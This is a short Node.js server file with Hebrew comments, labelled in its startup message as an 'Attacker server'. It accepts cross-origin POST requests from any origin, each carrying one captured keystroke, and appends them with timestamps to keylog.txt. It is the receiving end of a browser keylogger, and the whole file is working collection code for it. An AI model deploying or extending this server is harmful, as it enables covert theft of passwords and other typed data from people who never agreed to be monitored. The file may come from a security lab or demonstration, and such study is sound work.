const http = require('http');
const fs = require('fs');

const PORT = 4000;

const server = http.createServer((req, res) => {
  // הוספת כותרות CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // טיפול בבקשות OPTIONS (preflight)
  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  if (req.method === 'POST' && req.url === '/log') {
    let body = '';
    req.on('data', chunk => {
      body += chunk;
    });
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        if (typeof data.key === 'string' && data.key.length === 1) {
          console.log('Received key:', data.key);
        }
        const logLine = `[${new Date().toISOString()}] Key: ${data.key}\n`;
        fs.appendFileSync('keylog.txt', logLine);
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('Logged');
      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'text/plain' });
        res.end('Invalid data');
      }
    });
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not found');
  }
});

server.listen(PORT, () => {
  console.log(`Attacker server listening on port ${PORT}`);
}); 